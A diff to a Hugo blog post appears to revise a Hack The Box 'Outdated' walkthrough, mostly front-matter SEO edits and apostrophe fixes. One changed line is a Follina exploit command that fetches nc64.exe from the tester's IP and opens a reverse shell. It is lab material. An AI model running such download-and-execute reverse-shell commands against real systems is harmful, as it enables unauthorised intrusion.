@@ -1,12 +1,15 @@
 +++
-tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "WSUS", "Kerberos", "Follina", "Rubeus", "Whisker", "Shadow Credentials", "msDS-KeyCredentialLink"]
+title = "Outdated HTB Walkthrough: Active Directory, WSUS, and Follina Exploitation"
 draft = false
-title = "Outdated HTB Walkthrough"
+tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "WSUS", "Kerberos", "Follina", "Rubeus", "Whisker", "Shadow Credentials", "msDS-KeyCredentialLink"]
+keywords = ["Hack The Box Outdated", "Active Directory exploitation", "WSUS exploitation", "Follina vulnerability", "Windows privilege escalation", "Kerberos authentication", "Windows security assessment", "Active Directory penetration testing", "Shadow Credentials attack", "msDS-KeyCredentialLink exploitation"]
+description = "A comprehensive walkthrough of the Outdated machine from Hack The Box, covering Active Directory enumeration, WSUS exploitation, Follina vulnerability, and privilege escalation techniques. Learn about service account exploitation, shadow credentials attacks, and advanced Windows penetration testing methods."
 author = "bloodstiller"
 date = 2024-10-13
 toc = true
 bold = true
 next = true
+lastmod = 2024-10-13
 +++
 
 ## Outdated Hack The Box Walkthrough/Writeup: {#outdated-hack-the-box-walkthrough-writeup}
@@ -205,7 +208,7 @@ next = true
             -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.
 
             -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
-            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:
+            -   Here's a list of functional level numbers and their corresponding Windows Server operating systems:
 
                 | Functional Level Number | Corresponding OS            |
                 |-------------------------|-----------------------------|
@@ -377,7 +380,7 @@ If you are not aware, it is sometimes possible to extract valid domain usernames
         -   `-csv`: Outputs the data in CSV format.
             -   This is the most important part for the rest of the command to work:
                 -   The `CSV` format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF's metadata is presented as a row, and each field (like "`Creator`") is a column. This makes it easier to process the data programmatically.
-                -   **Simplicity**: When using tools like `cut`, it’s easier to extract specific fields by referring to column numbers (e.g., `-f2` for the second column), which is straightforward with `CSV` formatting.
+                -   **Simplicity**: When using tools like `cut`, it's easier to extract specific fields by referring to column numbers (e.g., `-f2` for the second column), which is straightforward with `CSV` formatting.
         -   `*pdf`: Targets all PDF files in the current directory.
     2.  `| cut -d, -f2`
         -   `|`: Pipes the output from the previous command into the next.
@@ -457,7 +460,7 @@ If you are not aware, it is sometimes possible to extract valid domain usernames
     -   It works through various troubleshooting packs, which are scripts or tools that identify and resolve specific issues (e.g., network connectivity, hardware problems).
     -   Often accessed via Windows troubleshooting settings or invoked by support agents when collecting system data remotely.
 
--   **How it’s triggered**:
+-   **How it's triggered**:
     -   Can be invoked manually by users or automatically through specific command-line arguments.
     -   In the case of the Follina exploit, it was invoked through a URL protocol (e.g., `ms-msdt:`) embedded in a malicious Office document.
 
@@ -524,7 +527,7 @@ If you are not aware, it is sometimes possible to extract valid domain usernames
     -   {{< figure src="/ox-hugo/2024-10-10-160601_.png" >}}
 
 -   **I put the** `nc64.exe` **in the same folder and modify my command**:
-    -   `python3 follina.py -i tun0 -p 9999  -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\Windows\Temp\nc64.exe; C:\Windows\Temp\nc64.exe -e cmd.exe 10.10.14.43 443`
+    -   `python3 follina.py -i tun0 -p 9999  -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\Windows\Temp\nc64.exe; C:\Windows\Temp\nc64.exe -e cmd.exe 10.10.14.43 443'`
     -   {{< figure src="/ox-hugo/2024-10-11-071239_.png" >}}
     -   What's strange is I can get it trigger the part where it reaches out to the webserver, but it never actually pulls down the `nc64.exe` binary however, it just reaches out to the server.
 
